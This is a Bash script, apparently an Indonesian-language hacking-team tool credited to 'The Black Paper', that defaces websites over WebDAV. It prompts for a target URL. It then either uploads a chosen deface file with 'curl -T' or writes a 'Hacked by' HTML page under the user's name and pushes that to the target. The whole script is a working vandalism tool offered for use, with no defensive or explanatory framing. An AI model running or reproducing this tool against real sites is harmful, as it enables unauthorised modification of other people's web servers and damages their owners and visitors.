clear
figlet WEBDAV
echo "===================="
echo "Made By The Black Paper"
echo "===================="
echo "----------------------"
echo "1.Deface Biasa        "
echo "2.belum punya sc deface"
echo "----------------------"
echo masukan pilihan
read ujang
if [ $ujang = "1" ]
then
cd ../..
clear
echo Masukan Web Target
read web
echo masukan letak sc deface
read sc
echo "loading......"
curl -T $sc $web
echo "Complete"

else
clear
echo Masukan Web Target
read web
echo Masukan Namamu
read nama
echo > index.html "<html><head><title>Hacked by $nama | THE BLACK PAPER TEAM </title><link href='http://fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'><link href='http://fonts.googleapis.com/css?family=Geo' rel='stylesheet' type='text/css'><link href='https://fonts.googleapis.com/css?family=Rancho&effect=shadow-multiple' rel='stylesheet' type='text/css'><link href='https://fonts.googleapis.com/css?family=Do+Hyeon' rel='stylesheet'><link href='https://fonts.googleapis.com/css?family=Do+Hyeon|Jua' rel='stylesheet'><link href='https://fonts.googleapis.com/css?family=Courgette|Do+Hyeon|IBM+Plex+Sans+Condensed|Jua|Teko' rel='stylesheet'><link href='https://fonts.googleapis.com/css?family=Courgette|Do+Hyeon|IBM+Plex+Sans+Condensed|Jua|News+Cycle|Teko' rel='stylesheet'>  <body bgcolor='black'><center><table width=100% height=94%><td align=center><font size='7' face=''IBM Plex Sans Condensed', sans-serif' color='#05ffee' style=' text-shadow: 0px 0px 0px #00f2ff; '><b>Hacked by $nama </b></font></center><br><br><hr width='50%'><center><br>   <table width=100% height=55%><td align=center>    <img src='https://1.bp.blogspot.com/-eyN8qlix3HM/X1N3jkh3RJI/AAAAAAAAAYE/04Okt18xX0MVZNoPUjQvLAbe0oNHiHzHACLcBGAsYHQ/s320/86591478-21a3-47f0-9ad0-1342297e9e6e.jpg' height='193' width='193'></center>      <center>               <br>               <hr width='50%'>                <table width=100% height=55%><td align=center>              <p id='info'><font size='5' face='courier new' color='#ddff05'>MESSEGE:</br></br><font style=' text-shadow: 0px 0px 0px;' size='3' color='#00ffdd'>HACKED BY THE BLACK PAPER TEAM              </font></p> "
echo "loading..."
curl -T index.html $web
echo "loading complete"
echo

fi
echo
echo
echo "=========================="
echo " ingin menggunakannya lagi?"
echo "==========================="
echo "(y/n)"
read cok


if [ $cok = "y" ]
then
sh webdav.sh
exit
else
sh bp.sh
exit
fi
